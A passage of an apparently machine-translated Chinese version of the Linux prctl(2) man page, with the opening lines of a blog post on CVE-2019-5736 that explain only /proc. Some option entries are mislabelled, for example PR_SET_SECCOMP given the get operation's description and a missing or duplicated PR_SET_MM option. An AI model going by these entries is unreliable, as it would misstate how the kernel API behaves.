设备模拟守护程序以及执行错误处理（如多路径路径恢复应用程序）的守护程序。 PR_GET_IO_FLUSHER （自 Linux 5.6 起）返回（作为函数结果）调用者的 IO_FLUSHER 状态。值为1表示调用者处于IO_FLUSHER状态； 0表示调用者不处于IO_FLUSHER状态。调用进程必须具有 CAP_SYS_RESOURCE能力。arg2、arg3、arg4 和 arg5 必须为零。 PR_SET_KEEPCAPS （自 Linux 2.2.18 起）设置调用线程的“keep capabilities”标志的状态。该标志的作用在capabilities(7) - Linux manual page (man7.org)中描述。 arg2 必须为 0（清除标志）或 1（设置标志）。在后续调用 execve(2) 时，“keep capabilities”值将重置为 0。 PR_GET_KEEPCAPS （自 Linux 2.2.18 起）返回（作为函数结果）调用线程的“keep capabilities”标志的当前状态。 PR_MCE_KILL (自 Linux 2.6.32 起) 为调用线程设置机器检查内存损坏终止策略。如果 arg2 为 PR_MCE_KILL_CLEAR，则清除线程内存损坏终止策略并使用系统范围的默认值。 （系统范围的默认值由 &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;memory_failure_early_kill 定义。）如果 arg2 是 PR_MCE_KILL_SET，则使用特定于线程的内存损坏终止策略。在这种情况下，arg3 定义策略是早期终止 (PR_MCE_KILL_EARLY)、晚期终止 (PR_MCE_KILL_LATE) 还是系统范围默认值 (PR_MCE_KILL_DEFAULT)。早期终止意味着一旦在其地址空间内检测到硬件内存损坏，线程就会收到 SIGBUS 信号。在晚期终止模式下，仅当进程访问损坏的页面时才会终止该进程。有关 SIGBUS 信号的更多信息，参阅sigaction(2) - Linux manual page (man7.org)。该政策由子进程继承。为了将来的兼容性，剩余未使用的 prctl() 参数必须为零。 PR_MCE_KILL_GET （自 Linux 2.6.32 起）返回（作为函数结果）当前per-process machine检查终止策略。所有未使用的 prctl() 参数必须为零。 PR_SET_MM （自 Linux 3.3 起）修改调用进程的某些内核内存映射描述符字段。通常这些字段由内核和动态加载器设置（有关更多信息，请参阅ld.so(8) - Linux manual page (man7.org)），常规应用程序不应使用此功能。然而，在某些情况下，例如自修改程序，程序可能会发现更改自己的内存映射很有用。 调用进程必须具有CAP_SYS_RESOURCE能力。 arg2 中的值是以下选项之一，而 arg3 为该选项提供新值。如果未使用，arg4 和 arg5 参数必须为零。 在 Linux 3.10 之前，只有在启用 CONFIG_CHECKPOINT_RESTORE 选项的情况下构建内核时，此功能才可用。 PR_SET_MM_START_CODE 设置程序文本可以在其上运行的地址。相应的内存区域必须可读且可执行，但不可写或可共享。 PR_SET_MM_END_CODE 设置程序文本可以运行的地址。相应的内存区域必须可读且可执行，但不可写或不可共享。 PR_SET_MM_START_DATA 设置above放置初始化和未初始化（bss）数据的地址。相应的内存区域必须可读可写，但不可执行或不可共享。 PR_SET_MM_END_DATA 设置below放置初始化和未初始化（bss）数据的地址。相应的内存区域必须可读可写，但不可执行或不可共享。 PR_SET_MM_START_STACK 设置堆栈的起始地址。相应的内存区域必须可读可写。 PR_SET_MM_START_BRK 设置可以通过 brk(2) 调用扩展程序堆的地址。该地址必须大于当前程序数据段的结束地址。此外，生成的堆的大小和数据段的大小之和不能超过 RLIMIT_DATA 资源限制。 PR_SET_MM_BRK 设置当前 brk(2) 值。地址的要求与 PR_SET_MM_START_BRK 选项相同。 自 Linux 3.5 起，以下选项可用。 PR_SET_MM_ARG_START 设置程序命令行所在的地址。 PR_SET_MM_ENV_START 设置程序环境所在的地址。 PR_SET_MM_ENV_END 设置程序环境所在的地址。 通过 PR_SET_MM_ARG_START、PR_SET_MM_ARG_END、PR_SET_MM_ENV_START 和 PR_SET_MM_ENV_END 传递的地址应属于进程堆栈区域。因此，相应的内存区域必须可读、可写，并且（取决于内核配置）设置了 MAP_GROWSDOWN 属性。 PR_SET_MM_AUXV 设置新的辅助向量。 arg3 参数应提供向量的地址。 arg4 是向量的大小。 PR_SET_MM_EXE_FILE 用指向 arg3 参数中提供的文件描述符标识的新可执行文件的新符号链接取代 &#x2F;proc&#x2F;pid&#x2F;exe 符号链接。文件描述符应该通过常规的 open(2) 调用来获取。要更改符号链接，需要取消映射所有现有的可执行内存区域，包括内核本身创建的内存区域（例如内核通常为 ELF .text 部分创建至少一个可执行内存区域）。 在Linux 4.9及更早版本中，PR_SET_MM_EXE_FILE操作在进程的生命周期中只能执行一次；尝试第二次执行该操作会导致错误 EPERM。出于安全原因强制执行此限制，后来被认为是似是而非的，并且在 Linux 4.10 中删除了该限制，因为某些用户空间应用程序需要多次执行此操作。 自 Linux 3.18 起，以下选项可用。 PR_SET_MM_MAP 通过传入 struct prctl_mm_map（&lt;linux&#x2F;prctl.h&gt;中定义）提供对所有地址的一次性访问。 arg4 参数应提供结构的大小。 PR_SET_MM_MAP_SIZE 返回内核期望的 struct prctl_mm_map 的大小。这允许用户空间找到兼容的结构。 arg4 参数应该是一个指向 unsigned int 的指针。仅当内核是在启用 CONFIG_CHECKPOINT_RESTORE 选项的情况下构建时，此功能才可用。 PR_SET_VMA 自 Linux 5.17 起）为从 arg3 中指定的地址开始并跨越 arg4 中指定的大小的虚拟内存区域设置 arg2 中指定的属性。 arg5 指定要设置的属性的值。 请注意，将属性分配给虚拟内存区域可能会由于该属性值的差异而阻止其与相邻虚拟内存区域合并。 目前，arg2 必须是以下之一： PR_SET_VMA_ANON_NAME PR_SET_VMA_ANON_NAME 设置匿名虚拟内存区域的名称。 arg5 应该是指向包含名称的以 null 结尾的字符串的指针。包含空字节的名称长度不能超过 80 个字节。如果 arg5 为 NULL，则相应匿名虚拟内存区域的名称将被重置。该名称只能包含可打印的 ASCII 字符（包括空格），“[”、“]”、“\\”、“$”和“&#96;”除外。 PR_MPX_ENABLE_MANAGEMENT,PR_MPX_DISABLE_MANAGEMENT （自 Linux 3.19 起，在 Linux 5.4 中删除；仅在 x86 上）启用或禁用内存保护扩展 (MPX) 边界表的内核管理。 arg2、arg3、arg4 和 arg5 参数必须为零。 MPX 是一种硬件辅助机制，用于对指针执行边界检查。 它由一组存储边界信息的寄存器和一组特殊指令前缀组成，这些前缀告诉 CPU 应该对哪些指令执行边界强制。 这些寄存器的数量有限，当指针多于寄存器时，它们的内容必须“溢出”到一组表中。这些表称为“边界表”，MPX prctl() 操作控制内核是否管理它们的分配和释放。 当启用管理时，内核将接管边界表的分配和释放。 它通过捕获首次使用缺失边界表时导致的 #BR 异常来实现此目的，并且不是将异常传递到用户空间，而是分配表并使用新表的位置填充边界目录。 对于释放，内核检查是否存在未分配内存的边界表，如果存在则释放它们。 在使用 PR_MPX_ENABLE_MANAGEMENT 启用 MPX 管理之前，应用程序必须首先为边界目录分配用户空间缓冲区，并将该目录的位置放入 bndcfgu 寄存器中。 如果 CPU 或内核不支持 MPX，这些调用将会失败。通过 CONFIG_X86_INTEL_MPX 配置选项启用对 MPX 的内核支持。您可以通过查找 mpx CPUID 位来检查 CPU 是否支持 MPX，例如使用以下命令： 1cat /proc/cpuinfo | grep &#x27; mpx &#x27; 启用 MPX 时，线程可能无法切入或切出长（64 位）模式。 进程中的所有线程都会受到这些调用的影响。 fork(2) 的子级继承 MPX 管理的状态。在 execve(2) 期间，MPX 管理重置为是否已调用 PR_MPX_DISABLE_MANAGEMENT 的状态。 有关 Intel MPX 的更多信息，请参阅内核源文件 Documentation&#x2F;x86&#x2F;intel_mpx.txt。 PR_SET_NAME 自 Linux 2.6.9 起）使用 (char *) arg2 指向的位置中的值设置调用线程的名称。 该名称最长可达 16 个字节，包括终止空字节。 （如果字符串的长度（包括终止空字节）超过 16 个字节，则该字符串将被静默截断。）这与可以通过 pthread_setname_np(3) 设置并使用 pthread_getname_np(3) 检索的属性相同。该属性同样可以通过 &#x2F;proc&#x2F;self&#x2F;task&#x2F;tid&#x2F;comm 访问，其中 tid 是调用线程的线程 ID，由 gettid(2) 返回。 PR_GET_NAME 返回调用线程的名称，位于 (char *) arg2 指向的缓冲区中。缓冲区应允许最多 16 个字节的空间；返回的字符串将以空字符结尾。 PR_SET_NO_NEW_PRIVS （自 Linux 3.5 起）将调用线程的 no_new_privs 属性设置为 arg2 中的值。当 no_new_privs 设置为 1 时，execve(2) 承诺不会授予执行任何没有 execve(2) 调用就无法完成的操作的权限（例如，呈现 set-user-ID 和 set-group-ID 模式位） ，并且文件功能不起作用）。 no_new_privs 属性一旦设置，就无法取消设置。该属性的设置由 fork(2) 和 clone(2) 创建的子级继承，并在 execve(2) 中保留。 Linux 4.10 开始，可以通过 &#x2F;proc&#x2F;pid&#x2F;status 文件中的 NoNewPrivs 字段查看线程的 no_new_privs 属性的值。 有关详细信息，请参阅内核源文件 Documentation&#x2F;userspace-api&#x2F;no_new_privs.rst（或 Linux 4.13 之前的 Documentation&#x2F;prctl&#x2F;no_new_privs.txt） PR_GET_NO_NEW_PRIVS （自 Linux 3.5 起）返回（作为函数结果）调用线程的 no_new_privs 属性的值。值 0 表示常规 execve(2) 行为。值 1 表示 execve(2) 将在上述特权限制模式下运行。 PR_PAC_RESET_KEYS （自 Linux 5.0 起，仅在 arm64 上）将线程的指针身份验证密钥安全地重置为内核生成的新随机值。 要重置的键集由 arg2 指定，它必须是以下零个或多个的逻辑或： PR_PAC_APIAKEY 指令认证密钥A PR_PAC_APIBKEY 指令认证密钥B PR_PAC_APDAKEY 数据认证密钥 A PR_PAC_APDBKEY 数据认证密钥 B PR_PAC_APGAKEY 用身份验证“A”密钥 作为一种特殊情况，如果 arg2 为零，则所有键都会重置。由于将来可能会添加新密钥，因此建议在建立干净的执行上下文时完全擦除现有密钥的方法。请注意，无需使用 PR_PAC_RESET_KEYS 来准备调用 execve(2)，因为 execve(2) 会重置所有指针身份验证密钥。 其余参数 arg3、arg4 和 arg5 必须全部为零。 如果参数无效，特别是如果 arg2 包含无法识别的设置位或对应于该平台上不可用的密钥的设置位，则调用将失败并显示错误 EINVAL。 警告：由于编译器或运行时环境可能正在使用部分或全部密钥，因此成功的 PR_PAC_RESET_KEYS 可能会导致调用进程崩溃。安全使用它的条件很复杂并且依赖于系统。除非您知道自己在做什么，否则不要使用它 有关详细信息，请参阅内核源文件 Documentation&#x2F;arm64&#x2F;pointer-authentication.rst（或 Linux 5.3 之前的 Documentation&#x2F;arm64&#x2F;pointer-authentication.txt）。 PR_SET_PDEATHSIG (自 Linux 2.1.57 起) 将调用进程的父死亡信号设置为 arg2（1..NSIG-1 范围内的信号值，或清除 0）。这是当其父进程死亡时调用进程将收到的信号。 警告：在这种情况下，“父进程”被认为是创建该进程的线程。换句话说，信号将在该线程终止时发送（例如通过 pthread_exit(3)），而不是在父进程中的所有线程终止之后发送。 父死亡信号在父线程随后终止时以及调用者随后重新定位到的每个subreaper进程（参见上面 PR_SET_CHILD_SUBREAPER 的描述）终止时发送。如果父线程和所有祖先subreaper在 PR_SET_PDEATHSIG 操作时已经终止，则不会向调用者发送父线程死亡信号。 父死亡信号是进程定向的（请参阅 signal(7) - Linux manual page (man7.org)），并且如果子进程使用 sigaction(2) SA_SIGINFO 标志安装处理程序，则处理程序的 siginfo_t 参数的 si_pid 字段包含终止父进程的 PID过程。 为 fork(2) 的子进程清除父进程死亡信号设置。当执行 set-user-ID 或 set-group-ID 二进制文件或具有关联功能的二进制文件时（自 Linux 2.4.36 &#x2F; 2.6.23 起），它也会被清除（请参阅capabilities(7) - Linux manual page (man7.org)）；否则，该值将在 execve(2) 中保留。当更改以下任何线程凭据时，父死亡信号设置也会被清除：有效用户 ID、有效组 ID、文件系统用户 ID 或文件系统组 ID。 PR_GET_PDEATHSIG (自 Linux 2.3.15 起) 返回父进程死亡信号的当前值，位于 (int *) arg2 指向的位置。 PR_SET_PTRACER （自 Linux 3.4 起）仅当 Yama LSM 启用且处于模式 1（“受限 ptrace”，通过 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama&#x2F;ptrace_scope 可见）时才有意义。当“ptracer 进程 ID”在 arg2 中传递时，调用者声明 ptracer 进程可以 ptrace(2) 调用进程，就好像它是直接进程祖先一样。每个 PR_SET_PTRACER 操作都会替换之前的“ptracer 进程 ID”。使用 PR_SET_PTRACER 并将 arg2 设置为 0 会清除调用者的“ptracer 进程 ID”。如果 arg2 为 PR_SET_PTRACER_ANY，则对调用进程有效禁用 Yama 引入的 ptrace 限制。 有关更多信息，请参阅内核源文件 Documentation&#x2F;admin-guide&#x2F;LSM&#x2F;Yama.rst（或 Linux 4.13 之前的 Documentation&#x2F;security&#x2F;Yama.txt）。 PR_SET_SECCOMP (自 Linux 2.6.23 起) 返回（作为函数结果）调用线程的安全计算模式。 如果调用方不处于安全计算模式，则该操作返回0；如果调用者处于严格安全计算模式，则 prctl() 调用将导致向进程发送 SIGKILL 信号。如果调用者处于过滤器模式，并且 seccomp 过滤器允许此系统调用，则返回 2；否则，进程将被 SIGKILL 信号终止。 仅当内核配置为启用 CONFIG_SECCOMP 时，此操作才可用。 从Linux 3.8开始，&#x2F;proc&#x2F;pid&#x2F;status文件的Seccomp字段提供了获取相同信息的方法，而不存在进程被杀死的风险 PR_SET_SECUREBITS （自 Linux 2.6.26 起）将调用线程的“securebits”标志设置为 arg2 中提供的值。 PR_GET_SPECULATION_CTRL （自 Linux 4.17 起）返回（作为函数结果）arg2 中指定的speculation错误特征的状态。目前，此参数唯一允许的值为 PR_SPEC_STORE_BYPASS （否则调用将失败并出现错误 ENODEV）。 返回值使用位 0-3，其含义如下： PR_SPEC_PRCTL 可以通过 PR_SET_SPECULATION_CTRL 按线程控制Mitigation。 PR_SPEC_ENABLE speculation功能已启用，mitigation功能已禁用。 PR_SPEC_DISABLE speculation功能已禁用，mitigation功能已启用。 PR_SPEC_FORCE_DISABLE PR_SPEC_FORCE_DISABLE 与 PR_SPEC_DISABLE 相同，但无法撤消。 PR_SPEC_DISABLE_NOEXEC （自 Linux 5.1 起）与 PR_SPEC_DISABLE 相同，但状态将在 execve(2) 上清除。 如果所有位均为 0，则 CPU 不会受到speculation misfeature的影响。 如果设置了 PR_SPEC_PRCTL，则可以使用per-thread控制mitigation措施。如果未设置，用于推测错误功能的 prctl() 将失败。arg3、arg4 和 arg5 参数必须指定为 0；否则调用会失败并显示错误 EINVAL。 PR_SET_SPECULATION_CTRL （自 Linux 4.17 起）设置 arg2 中指定的推测错误功能的状态。speculation-misfeature设置是每个线程的属性 目前，arg2 必须是以下之一： PR_SPEC_STORE_BYPASS 设置speculative store bypass misfeature的状态。 PR_SPEC_INDIRECT_BRANCH （自 Linux 4.20 起）设置间接分支speculation misfeature的状态。 如果 arg2 不具有上述值之一，则调用将失败并出现错误 ENODEV。arg3 参数用于传入控制值，该值是以下之一： PR_SPEC_ENABLE speculation feature已开启，mitigation已禁用 PR_SPEC_DISABLE speculation feature已禁用，mitigation已开启 PR_SPEC_FORCE_DISABLE PR_SPEC_FORCE_DISABLE 与 PR_SPEC_DISABLE 相同，但无法撤消。具有相同 arg2 值的后续 prctl(arg2, PR_SPEC_ENABLE) 将失败并出现错误 EPERM。 PR_SPEC_DISABLE_NOEXEC （自 Linux 5.1 起）与 PR_SPEC_DISABLE 相同，但状态将在 execve(2) 上清除。目前仅支持 arg2 等于 PR_SPEC_STORE_BYPASS。 arg3 中任何不支持的值都将导致调用失败并出现错误 ERANGE。 arg4 和 arg5 参数必须指定为 0；否则调用会失败并显示错误 EINVAL。 speculation feature还可以通过 spec_store_bypass_disable 启动参数进行控制。此参数可能会强制执行只读策略，这将导致 prctl() 调用失败并出现错误 ENXIO。有关更多详细信息，请参阅内核源文件 Documentation&#x2F;admin-guide&#x2F;kernel-parameters.txt。 PR_SVE_SET_VL （自 Linux 4.15 起，仅在 arm64 上）配置线程的 SVE 矢量长度，由 (int) arg2 指定。参数 arg3、arg4 和 arg5 将被忽略。 与 PR_SVE_VL_LEN_MASK 对应的 arg2 位必须设置为所需的向量长度（以字节为单位）。这被解释为上限：内核将选择不超过指定值的最大可用向量长度。特别是，为 PR_SVE_VL_LEN_MASK 位指定 SVE_VL_MAX（在 中定义）会请求最大支持的向量长度。 此外，arg2 的其他位必须设置为以下标志组合之一： 0 立即执行更改。在线程中的下一个 execve(2) 中，向量长度将重置为 &#x2F;proc&#x2F;sys&#x2F;abi&#x2F;sve_default_vector_length 中配置的值。 PR_SVE_VL_INHERIT 立即执行更改。随后的 execve(2) 调用将保留新的向量长度。 PR_SVE_SET_VL_ONEXEC 推迟更改，以便在线程中的下一个 execve(2) 时执行更改。进一步的 execve(2) 调用会将向量长度重置为 &#x2F;proc&#x2F;sys&#x2F;abi&#x2F;sve_default_vector_length 中配置的值。 PR_SVE_SET_VL_ONEXEC | PR_SVE_VL_INHERIT 推迟更改，以便在线程中的下一个 execve(2) 时执行更改。进一步的 execve(2) 调用将保留新的向量长度。 在所有情况下，任何先前待处理的延迟更改都会被取消。 如果平台不支持 SVE，如果 arg2 无法识别或无效，或者与 PR_SVE_VL_LEN_MASK 对应的 arg2 位中的值超出 SVE_VL_MIN..SVE_VL_MAX 范围或不是 16 的倍数，则调用会失败并返回错误 EINVAL。 成功后，将返回一个描述所选配置的非负值。如果 PR_SVE_SET_VL_ONEXEC 包含在 arg2 中，则返回值描述的配置将在下一次 execve(2) 时生效。否则，当 PR_SVE_SET_VL 调用返回时，配置已生效。无论哪种情况，该值的编码方式都与 PR_SVE_GET_VL 的返回值相同。请注意，PR_SVE_SET_VL_ONEXEC 对应的返回值中没有显式标志。 配置（包括任何挂起的延迟更改）在 fork(2) 和 clone(2) 之间继承。 更多信息请参见内核源文件Documentation&#x2F;arm64&#x2F;sve.rst（或Linux 5.3之前的Documentation&#x2F;arm64&#x2F;sve.txt）。 警告：由于编译器或运行时环境可能正在使用 SVE，因此在没有 PR_SVE_SET_VL_ONEXEC 标志的情况下使用此调用可能会导致调用进程崩溃。安全使用它的条件很复杂并且依赖于系统。除非您真正知道自己在做什么，否则不要使用它。 PR_SVE_GET_VL （自Linux 4.15起，仅在arm64上）获取线程当前的SVE向量长度配置。 参数 arg2、arg3、arg4 和 arg5 将被忽略。 如果内核和平台支持 SVE，则此操作始终会成功，并返回描述当前配置的非负值。 PR_SVE_VL_LEN_MASK 对应的位包含当前配置的向量长度（以字节为单位）。 PR_SVE_VL_INHERIT 对应的位指示向量长度是否将在 execve(2) 之间继承。 请注意，无法确定是否存在尚未生效的挂起向量长度更改。 更多信息请参见内核源文件Documentation&#x2F;arm64&#x2F;sve.rst（或Linux 5.3之前的Documentation&#x2F;arm64&#x2F;sve.txt）。 PR_SET_SYSCALL_USER_DISPATCH （自 Linux 5.11 起，仅限 x86）为调用线程配置 Syscall 用户调度机制。 此机制允许应用程序有选择地拦截系统调用，以便可以在应用程序本身内处理它们。拦截采用线程定向的 SIGSYS 信号的形式，该信号在线程进行系统调用时传递给线程。如果被拦截，系统调用将不会被内核执行。 要启用此机制，arg2 应设置为 PR_SYS_DISPATCH_ON。一旦启用，将根据用户空间提供的控制变量有选择地拦截进一步的系统调用。在这种情况下，arg3 和 arg4 分别标识进程地址空间中单个连续内存区域的偏移量和长度，无论控制变量如何，始终允许执行系统调用。（通常，该区域包括包含 C 库的内存区域。） arg5 指向一个字符大小的变量，它是一个快速开关，用于允许&#x2F;阻止系统调用执行，而无需执行另一个系统调用来重新配置系统调用用户调度。该控制变量可以设置为 SYSCALL_DISPATCH_FILTER_BLOCK 以阻止系统调用执行，也可以设置为 SYSCALL_DISPATCH_FILTER_ALLOW 以暂时允许它们执行。内核会在每个系统调用条目上检查该值，任何意外值都会在那时引发无法捕获的 SIGSYS，从而终止应用程序。 当系统调用被拦截时，内核会向触发线程发送一个线程定向的 SIGSYS 信号。与信号关联的 siginfo_t 结构（请参阅sigaction(2) - Linux manual page (man7.org)）中将设置各种字段： si_signo 将包含SIGSYS。 si_call_addr 将显示系统调用指令的地址。 si_syscall 和si_arch 将指示尝试了哪个系统调用。 si_code 将包含SYS_USER_DISPATCH。 si_errno 将设置为0。 程序计数器将如同发生了系统调用一样（即程序计数器不会指向系统调用指令）。 当信号处理程序返回内核时，系统调用立即完成并返回到调用线程，而不实际执行。 如果有必要（即，在用户空间上模拟系统调用时），信号处理程序应通过修改存储在信号处理程序的 ucontext 参数中的寄存器上下文，将系统调用返回值设置为正常值。有关详细信息，请参阅 sigaction(2) - Linux manual page (man7.org)、sigaction(2) - Linux manual page (man7.org) 和 getcontext(3) - Linux manual page (man7.org)。 如果 arg2 设置为 PR_SYS_DISPATCH_OFF，则对该线程禁用系统调用用户调度。其余参数必须设置为 0。 该设置不会在 fork(2)、clone(2) 或 execve(2) 中保留。 有关更多信息，请参阅内核源文件 Documentation&#x2F;admin-guide&#x2F;syscall-user-dispatch.rst PR_SET_TAGGED_ADDR_CTRL （自 Linux 5.4 起，仅在 arm64 上）控制对将标记的用户空间地址传递到内核的支持（即位 56-63 不全为零的地址）。 支持级别由 arg2 选择，可以是以下之一： 0 为内核取消引用而传递的地址必须取消标记。 PR_TAGGED_ADDR_ENABLE 为了被内核取消引用而传递的地址可以被标记，但下面总结的例外情况。 其余参数 arg3、arg4 和 arg5 必须全部为零。 成功时，为调用线程设置 arg2 中指定的模式，并且返回值为 0。如果参数无效，则无法识别 arg2 中指定的模式，或者内核不支持此功能或通过 &#x2F;proc&#x2F;sys&#x2F;abi&#x2F;tagged_addr_disabled禁用此功能，调用失败并出现错误 EINVAL。 特别是，如果 prctl(PR_SET_TAGGED_ADDR_CTRL, 0, 0, 0, 0) 因 EINVAL 失败，则传递到内核的所有地址都必须取消标记。 无论设置哪种模式，传递到某些接口的地址必须始终未标记： brk(2)、mmap(2)、shmat(2)、shmdt(2) 和 mremap(2) 的 new_address 参数。（在 Linux 5.6 之前，这些已接受的标记地址，但行为可能不是您所期望的。不要依赖它。） polymorphic接口，接受指向强制转换为 void * 或其他泛型类型的任意类型的指针，特别是 prctl()、ioctl(2) 和一般的 setsockopt(2)（仅某些特定的 setsockopt(2) 选项允许标记地址） ）。从一个内核版本迁移到更高版本的内核版本时，此排除列表可能会缩小。虽然内核可能会出于向后兼容性的原因做出一些保证，但出于新软件的目的，未指定将标记地址传递给这些接口的效果。此调用设置的模式在 fork(2) 和 clone(2) 之间继承。该模式由 execve(2) 重置为 0（即，用户&#x2F;内核 ABI 中不允许标记地址）。 有关更多信息，请参阅内核源文件 Documentation&#x2F;arm64&#x2F;tagged-address-abi.rst。 警告：此调用主要供运行时环境使用。在其他地方成功调用 PR_SET_TAGGED_ADDR_CTRL 可能会使调用进程崩溃。安全使用它的条件很复杂并且依赖于系统。除非您知道自己在做什么，否则不要使用它。 PR_GET_TAGGED_ADDR_CTRL （自 Linux 5.4 起，仅在 arm64 上）返回调用线程的当前标记地址模式。 参数 arg2、arg3、arg4 和 arg5 必须全部为零。 如果参数无效或者内核禁用或不支持此功能，则调用将失败并显示 EINVAL。特别是，如果 prctl(PR_GET_TAGGED_ADDR_CTRL, 0, 0, 0, 0) 因 EINVAL 失败，则该功能肯定不受支持，或者通过 &#x2F;proc&#x2F;sys&#x2F;abi&#x2F;tagged_addr_disabled 禁用。在这种情况下，传递给内核的所有地址都必须取消标记。否则，调用返回一个描述当前标记地址模式的非负值，其编码方式与 PR_SET_TAGGED_ADDR_CTRL 的 arg2 参数相同。 有关更多信息，请参阅内核源文件 Documentation&#x2F;arm64&#x2F;tagged-address-abi.rst。 PR_TASK_PERF_EVENTS_DISABLE （自 Linux 2.6.31 起）禁用附加到调用进程的所有性能计数器，无论计数器是由该进程还是另一个进程创建。调用进程为其他进程创建的性能计数器不受影响。有关性能计数器的更多信息，请参阅 Linux 内核源文件 tools&#x2F;perf&#x2F;design.txt。 最初称为 PR_TASK_PERF_COUNTERS_DISABLE；在 Linux 2.6.32 中重命名（保留相同的数值）。 PR_TASK_PERF_EVENTS_ENABLE （自 Linux 2.6.31 起）与 PR_TASK_PERF_EVENTS_DISABLE 相反；启用附加到调用进程的性能计数器。最初称为 PR_TASK_PERF_COUNTERS_ENABLE；在 Linux 2.6.32 中重命名。 PR_SET_THP_DISABLE （自 Linux 3.15 起）设置调用线程的“THP 禁用”标志的状态。如果 arg2 具有非零值，则设置该标志，否则将其清除。设置此标志提供了一种为无法修改代码的作业禁用透明大页的方法，并且不能选择使用带有 madvise(2) 的 malloc 挂钩（即静态分配数据）。 “THP disable”标志的设置由通过 fork(2) 创建的子进程继承，并在 execve(2) 中保留。 PR_GET_THP_DISABLE （自 Linux 3.15 起）返回（作为函数结果）调用线程的“THP disable”标志的当前设置：如果设置了该标志，则为 1；如果未设置，则为 0。 PR_GET_TID_ADDRESS （自 Linux 3.5 起）返回由 set_tid_address(2) 和 clone(2) CLONE_CHILD_CLEARTID 标志设置的clear_child_tid 地址，位于 (int **) arg2 指向的位置。仅当内核是在启用 CONFIG_CHECKPOINT_RESTORE 选项的情况下构建时，此功能才可用。请注意，由于 prctl() 系统调用没有 AMD64 x32 和 MIPS n32 ABI 的兼容实现，并且内核使用内核的指针大小写出指针，因此该操作需要 8 个（而不是 4 个）的用户空间缓冲区。 ) 这些 ABI 上的字节。 PR_SET_TIMERSLACK （自 Linux 2.6.28 起） 每个线程都有两个关联的计时器松弛值：“默认”值和“当前”值。此操作为调用线程设置“当前”计时器裕量值。 arg2 是一个无符号长整型值，则最大“当前”值为 ULONG_MAX，最小“当前”值为 1。如果 arg2 中提供的纳秒值大于零，则“当前”值将设置为此值。如果 arg2 等于 0，则“当前”定时器裕量将重置为线程的“默认”定时器裕量值。内核使用“当前”计时器裕量对彼此接近的调用线程的计时器到期时间进行分组；因此，线程的计时器到期可能会延迟指定的纳秒数（但永远不会提前到期）。 对定时器到期进行分组可以通过最大限度地减少 CPU 唤醒来帮助降低系统功耗。 受计时器松弛影响的计时器到期时间是由 select(2)、pselect(2)、poll(2)、ppoll(2)、epoll_wait(2)、epoll_pwait(2)、clock_nanosleep(2)、nanosleep(2) 设置的计时器到期时间和 futex(2)（以及通过 futex 实现的库函数，包括 pthread_cond_timedwait(3)、pthread_mutex_timedlock(3)、pthread_rwlock_timedrdlock(3)、pthread_rwlock_timedwrlock(3) 和 sem_timedwait(3)）。 计时器裕量不适用于在实时调度策略下调度的线程（请参阅 sched_setscheduler(2)）。 当创建新线程时，两个计时器松弛值将与创建线程的“当前”值相同。此后，线程可以通过 PR_SET_TIMERSLACK 调整其“当前”计时器松弛值。 “默认”值无法更改。所有进程的祖先 init (PID 1) 的计时器裕量值为 50,000 纳秒（50 微秒）。计时器松弛值由通过 fork(2) 创建的子进程继承，并在 execve(2) 中保留。 从 Linux 4.6 开始，任何进程的“当前”计时器松弛值都可以通过文件 &#x2F;proc&#x2F;pid&#x2F;timerslack_ns 进行检查和更改。 PR_GET_TIMERSLACK （自 Linux 2.6.28 起）返回（作为函数结果）调用线程的“当前”计时器松弛值。 PR_SET_TIMING （自 Linux 2.6.0 起）通过将 PR_TIMING_STATISTICAL 或 PR_TIMING_TIMESTAMP 传递给 arg2，设置是使用（正常、传统）统计进程计时还是基于精确时间戳的进程计时。 PR_TIMING_TIMESTAMP 当前尚未实现（尝试设置此模式将产生错误 EINVAL）。 PR_GET_TIMING (自 Linux 2.6.0 起) 返回（作为函数结果）当前正在使用哪个进程计时方法。 PR_SET_TSC （自 Linux 2.6.26 起，仅限 x86）设置标志的状态，确定时间戳计数器是否可以由进程读取。将 PR_TSC_ENABLE 传递给 arg2 以允许读取它，或将 PR_TSC_SIGSEGV 传递给 arg2 以在进程尝试读取时间戳计数器时生成 SIGSEGV。 PR_GET_TSC （自 Linux 2.6.26 起，仅限 x86）返回标志的状态，确定时间戳计数器是否可以读取，位于 (int *) arg2 指向的位置。 PR_SET_UNALIGN （仅适用于：ia64，自 Linux 2.3.48 起；parisc，自 Linux 2.6.15 起；PowerPC，自 Linux 2.6.18 起；Alpha，自 Linux 2.6.22 起；sh，自 Linux 2.6.34 起；tile，自 Linux 3.12 起) 将未对齐的访问控制位设置为 arg2。传递 PR_UNALIGN_NOPRINT 以静默方式修复未对齐的用户访问，或传递 PR_UNALIGN_SIGBUS 以在未对齐的用户访问上生成 SIGBUS。 Alpha 还支持值为 4 且没有相应命名常量的附加标志，该标志指示内核不要修复未对齐的访问（类似于在 Tru64 上的 setsysinfo() 系统调用的 SSI_NVPAIRS 操作中提供 UAC_NOFIX 标志）。 PR_GET_UNALIGN (有关版本和体系结构的信息，请参阅 PR_SET_UNALIGN。）返回 (unsigned int *) arg2 指向的位置中未对齐的访问控制位。","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"系统调用","slug":"Linux内核/系统调用","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"}],"tags":[]},{"title":"漏洞分析 CVE-2019-5736","slug":"漏洞分析-CVE-2019-5736","date":"2023-12-15T06:52:27.000Z","updated":"2023-12-16T09:05:15.247Z","comments":true,"path":"2023/12/15/漏洞分析-CVE-2019-5736/","link":"","permalink":"http://example.com/2023/12/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2019-5736/","excerpt":"漏洞原理分析procproc是一种伪文件系统，以文件的形式存储当前内核运行的情况，用户可以编写程序以读取文件的形式读取内核的运行情况并修改。","text":"漏洞原理分析procproc是一种伪文件系统，以文件的形式存储当前内核运行的情况，用户可以编写程序以读取文件的形式读取内核的运行情况并修改。 为了查看及使用上的方便，这些文件通常会按照相关性进行分类存储于不同的目录甚至子目录中，如/proc/scsi目录中存储的就是当前系统上所有SCSI设备的相关信息，/proc/pid中存储的则是系统当前正在运行的进程的相关信息，其中N为正在运行的进程 proc(5) - Linux manual page (man7.org) pid namespacePid 